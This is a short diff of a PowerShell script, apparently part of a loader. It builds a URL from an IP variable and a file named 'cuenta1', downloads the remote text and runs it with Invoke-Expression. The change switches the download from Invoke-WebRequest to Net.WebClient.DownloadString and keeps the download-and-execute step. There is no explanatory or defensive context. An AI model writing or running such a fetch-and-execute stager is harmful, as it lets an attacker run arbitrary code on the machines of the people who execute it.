@@ -4,5 +4,5 @@ $file="cuenta1"
 $uri = "https://";$uri+=$ip;$uri+="/";$uri+=$file;$uri+=".txt"
 $uri
 
-$down= Invoke-WebRequest $uri
-Invoke-Expression $down.content
+$down= (New-Object Net.WebClient).DownloadString($uri)
+Invoke-Expression $down
